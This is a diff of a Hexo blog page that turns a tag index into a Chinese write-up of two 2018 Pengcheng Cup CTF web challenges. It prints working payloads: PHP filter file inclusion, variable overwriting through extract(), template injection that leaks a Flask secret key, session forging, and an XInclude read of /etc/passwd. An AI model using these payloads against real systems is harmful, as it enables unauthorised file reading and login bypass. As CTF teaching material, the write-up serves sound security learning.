@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="WriteUp,CTF," />
 
 
 
@@ -87,12 +87,25 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Windylh's blog">
-<meta property="og:url" content="http://yoursite.com/tags/SQL注入/index.html">
+<meta name="description" content="myblog这道题脑洞很大。。。做起来很痛苦。
+index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。
+payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018鹏城杯myblog& Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/index.html">
 <meta property="og:site_name" content="Windylh's blog">
+<meta property="og:description" content="myblog这道题脑洞很大。。。做起来很痛苦。
+index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。
+payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resou">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2018.12.1/shadow.jpg">
+<meta property="og:updated_time" content="2018-12-02T17:00:02.878Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Windylh's blog">
+<meta name="twitter:title" content="2018鹏城杯myblog& Writeup">
+<meta name="twitter:description" content="myblog这道题脑洞很大。。。做起来很痛苦。
+index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。
+payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resou">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png">
 
 
 
@@ -120,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/SQL注入/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/"/>
 
 
 
 
 
-  <title> 标签: SQL注入 | Windylh's blog </title>
+  <title> 2018鹏城杯myblog& Writeup | Windylh's blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -151,7 +164,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -235,46 +248,189 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-collapse">
-    <div class="collection-title">
-      <h2 >
-        SQL注入
-        <small>标签</small>
-      </h2>
-    </div>
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                2018鹏城杯myblog& Writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-01T00:00:00+08:00">
+                2018-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/12/01/2018鹏城杯Web(部分)Writeup/" class="leancloud_visitors" data-flag-title="2018鹏城杯myblog& Writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
       
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+      
+        <h3 id="myblog"><a href="#myblog" class="headerlink" title="myblog"></a>myblog</h3><p>这道题脑洞很大。。。做起来很痛苦。</p>
+<p>index.php的header中有<code>flag: JTNGZmxhZw==</code>，解base64得到参数<code>%3Fflag</code>，猜测index.php存在文件包含，运用flag参数读文件。</p>
+<p>payload:<code>http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=index</code></p>
+<a id="more"></a>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    header(<span class="string">'flag: JTNGZmxhZw=='</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"flag"</span>]))&#123;</div><div class="line">        $flag = $_GET[<span class="string">"flag"</span>];</div><div class="line">        <span class="keyword">include</span> $flag.<span class="string">".php"</span>;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提示aboutyou后端，about里也提到了base64，猜测存在<code>YWJvdXQ=.php</code></p>
+<p>payload:<code>http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=YWJvdXQ=</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    $filename = <span class="string">'flag.txt'</span>;</div><div class="line">    $flag = <span class="string">'flag.txt'</span>;</div><div class="line">    extract($_GET);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($sign))&#123;</div><div class="line">        $file = trim(file_get_contents($filename));</div><div class="line">        <span class="keyword">if</span>($sign === $file)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Congratulation!&lt;br&gt;'</span>;</div><div class="line">            <span class="keyword">echo</span> file_get_contents($$falg);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'don`t give up'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>变量覆盖，让$sign为空，$file读取不存在的文件，让$falg为flag读取文件。</p>
+<p>payload:<code>http://58.20.46.150:26293/YWJvdXQ=.php?sign=&amp;filename=123&amp;falg=flag</code></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png" alt=""></p>
+<h3 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h3><p>这题没有拿到flag，但是感觉也进行了绝大部分了，记录一下</p>
+<p>题目提示有upload，直接访问提示<code>Only admin can use it!</code></p>
+<p>尝试模版注入拿到secret_key进行session伪造，发现访问不存在的页面可以进行模版注入</p>
+<p>payload:<figure class="highlight plain"><figcaption><span>1+1 &#125;&#125;```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">过滤了括号等，和twctf2018的Shrine相似</div><div class="line"></div><div class="line">[CTFtime.org _ TokyoWesterns CTF 4th 2018 _ Shrine _ Writeup](https://ctftime.org/writeup/10895)</div><div class="line"></div><div class="line">payload:```http://58.20.46.150:25524/&#123;&#123; url_for.__globals__[&apos;current_app&apos;].config &#125;&#125;</div></pre></td></tr></table></figure></p>
+<p>拿到secret_key为:<code>as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf</code></p>
+<p>构造session，以admin登陆，访问upload，发现文件的表单名是xml，猜测可以上传xml内容进行解析</p>
+<p>用xinclude来读取文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=“<span class="number">1.0</span>” <span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">“http://www.w3.org/2001/XInclude“</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">“file:///etc/passwd”</span> <span class="attr">parse</span>=<span class="string">“text”/</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.12.1/shadow.jpg" alt=""></p>
+<p>但是最后没有找到flag，比赛结束了。。。不知道是不是有没发现的东西。</p>
 
-      <h1 class="post-title">
+      
+    </div>
+
+    <div>
+      
         
-            <a class="post-title-link" href="/2017/03/27/南方数据靶机渗透测试/" itemprop="url">
-              
-                <span itemprop="name">南方数据靶机渗透测试</span>
-              
-            </a>
+
+      
+    </div>
+
+    <div>
+      
         
-      </h1>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-03-27T00:00:00+08:00"
-              content="2017-03-27" >
-          03-27
-        </time>
-      </div>
+      
+    </div>
 
-    </header>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/15/Dlink DIR-823L远程敏感信息读取漏洞/" rel="next" title="Dlink DIR-823L远程敏感信息读取漏洞">
+                <i class="fa fa-chevron-left"></i> Dlink DIR-823L远程敏感信息读取漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </article>
 
 
-    
-  </div>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -282,6 +438,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -301,8 +461,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
@@ -415,6 +584,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#myblog"><span class="nav-number">1.</span> <span class="nav-text">myblog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shadow"><span class="nav-number">2.</span> <span class="nav-text">shadow</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -521,6 +706,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
